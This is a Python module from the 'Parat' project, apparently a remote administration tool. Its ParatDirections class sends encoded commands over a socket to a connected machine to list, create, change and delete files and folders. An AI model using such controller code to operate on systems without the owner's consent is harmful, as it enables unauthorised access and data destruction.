#
# Copyright(c) 2017, micle(@micle_fm - www.micle.ir - mhd.ceh8@gmail)
# Parat project is under the GNU GENERAL PUBLIC LICENSE (GPL) license.
# see the COPYING file for the detailed licence terms
#

import argparse
from lib.ParatPrint import colorize, pprint, gray
from lib.ParatEncrypt import Encode, Decode



class ParatDirections:

    def __init__(self, conn, colors):

        self.helps   = ["-h", "--help"]
        self.conn    = conn
        self.colors  = colors


    def get_tree(self):

        self.conn.send(Encode("tree"))
        pprint(Decode(self.conn.recv(4096)))


    def change_directory(self, dirc):

        if dirc is not None and len(dirc) != 0:

            directory = dirc[0].strip()

            self.conn.send(Encode("cd<#>" + directory))

            response = Decode(self.conn.recv(4096)) + "\n"
            pprint(response) if self.colors else pprint(gray(response))

        else:
            pprint(
                colorize(
                    "usage: cd \"New Folder\" \n",
                    colored=self.colors,
                    status="INF"
                ))


    def touch_file(self, args):

        parser = argparse.ArgumentParser(
            prog         = "modules.File",
            usage        = "touch -n/--name NAME [-t/--text CONTENT]",
            description  = "simple command for create files"
        )

        parser.add_argument(
            '-n', '--name',
            required     = True,
            help         = "file name you want to create"
        )
        parser.add_argument(
            '-t', '--text',
            metavar      = "CONTENT",
            help         = "create file with this content"
        )



        if args is None or len(args) == 0 or args[0] in self.helps:
            parser.print_help()

        else:

            try:

                argument = parser.parse_args(args)

                if argument.text:

                    command = "touch<#>name_and_text<#>" + argument.name + "<#>" + argument.text
                    self.conn.send(Encode(command))
                    response = Decode(self.conn.recv(4096))
                    pprint(response) if self.colors else pprint(gray(response))

                else:

                    command = "touch<#>name<#>" + argument.name
                    self.conn.send(Encode(command))
                    response = Decode(self.conn.recv(4096))
                    pprint(response) if self.colors else pprint(gray(response))

            except:
                pass



    def make_directory(self, new_folder):

        if new_folder is not None and len(new_folder) != 0:

            new_folder = new_folder[0].strip()

            self.conn.send(Encode("mkdir<#>" + new_folder))
            response = Decode(self.conn.recv(4096))
            pprint(response) if self.colors else pprint(gray(response))

        else:
            pprint(
                colorize(
                    "usage: mkdir \"New Foler\" \n",
                    colored=self.colors,
                    status="INF"
                ))



    def remove(self, arg):

        if arg is not None and len(arg) != 0:

            arg          = arg[0].strip()
            folder_flag  = False
            file_flag    = False

            self.conn.send(Encode("rmv<#>" + arg))

            response = Decode(self.conn.recv(4096))
            pprint(response) if self.colors else pprint(gray(response))

        else:
            pprint(
                colorize(
                    "usage: rmv anything\n",
                    colored=self.colors,
                    status="INF"
                ))


    def pwd(self):

        self.conn.send(Encode("pwd"))
        response = '\n' + Decode(self.conn.recv(4096)) + '\n\n'

        pprint(response) if self.colors else pprint(gray(response))
